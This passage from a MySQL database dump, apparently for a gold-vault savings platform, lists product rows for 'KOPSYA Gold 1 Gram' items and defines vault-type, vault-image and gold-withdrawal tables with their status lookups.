(77, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010077', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(78, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010078', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(79, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010079', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(80, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010080', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(81, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010081', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(82, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010082', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(83, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010083', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(84, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010084', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(85, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010085', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(86, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010086', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(87, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010087', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(88, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010088', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(89, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010089', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(90, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010090', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(91, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010091', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(92, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010092', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(93, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010093', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(94, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010094', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(95, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010095', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(96, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010096', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(97, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010097', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(98, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010098', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(99, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010099', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(100, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010100', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00');

-- --------------------------------------------------------

--
-- Table structure for table `vault_image`
--

CREATE TABLE IF NOT EXISTS `vault_image` (
  `vi_id` int(11) NOT NULL AUTO_INCREMENT,
  `vi_name` varchar(200) NOT NULL,
  `vi_size` int(11) NOT NULL DEFAULT '0',
  `vi_type` varchar(200) NOT NULL,
  `vi_status` int(11) NOT NULL DEFAULT '1',
  `v_id` int(11) NOT NULL,
  PRIMARY KEY (`vi_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `vault_type`
--

CREATE TABLE IF NOT EXISTS `vault_type` (
  `vt_id` int(11) NOT NULL AUTO_INCREMENT,
  `vt_name` varchar(200) NOT NULL,
  PRIMARY KEY (`vt_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=6 ;

--
-- Dumping data for table `vault_type`
--

INSERT INTO `vault_type` (`vt_id`, `vt_name`) VALUES
(1, 'Vault Bid'),
(2, 'Vault Ghost'),
(3, 'Vault Keep'),
(4, 'Vault Pawn'),
(5, 'Vault Store');

-- --------------------------------------------------------

--
-- Table structure for table `withdrawal_gram`
--

CREATE TABLE IF NOT EXISTS `withdrawal_gram` (
  `wg_id` int(11) NOT NULL AUTO_INCREMENT,
  `tr_id` int(11) NOT NULL,
  `me_id` int(11) NOT NULL,
  `wg_code` varchar(200) NOT NULL,
  `wg_datetime` datetime NOT NULL,
  `wg_type` varchar(200) NOT NULL,
  `wg_address` varchar(500) NOT NULL,
  `wgs_id` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`wg_id`),
  UNIQUE KEY `wg_code` (`wg_code`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `withdrawal_gram_child`
--

CREATE TABLE IF NOT EXISTS `withdrawal_gram_child` (
  `wgc_id` int(11) NOT NULL AUTO_INCREMENT,
  `wg_id` int(11) NOT NULL,
  `v_id` int(11) NOT NULL,
  `wgc_collectdatetime` datetime NOT NULL,
  `wgcs_id` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`wgc_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `withdrawal_gram_child_status`
--

CREATE TABLE IF NOT EXISTS `withdrawal_gram_child_status` (
  `wgcs_id` int(11) NOT NULL AUTO_INCREMENT,
  `wgcs_desc` varchar(200) NOT NULL,
  PRIMARY KEY (`wgcs_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

--
-- Dumping data for table `withdrawal_gram_child_status`
--

INSERT INTO `withdrawal_gram_child_status` (`wgcs_id`, `wgcs_desc`) VALUES
(1, 'Pending'),
(2, 'Collected'),
(3, 'Rejected');

-- --------------------------------------------------------

--
-- Table structure for table `withdrawal_gram_status`
--

CREATE TABLE IF NOT EXISTS `withdrawal_gram_status` (
  `wgs_id` int(11) NOT NULL AUTO_INCREMENT,
  `wgs_desc` varchar(200) NOT NULL,
  PRIMARY KEY (`wgs_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

--
-- Dumping data for table `withdrawal_gram_status`
--

INSERT INTO `withdrawal_gram_status` (`wgs_id`, `wgs_desc`) VALUES
(1, 'Pending'),
(2, 'Completed'),
(3, 'Rejected');

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
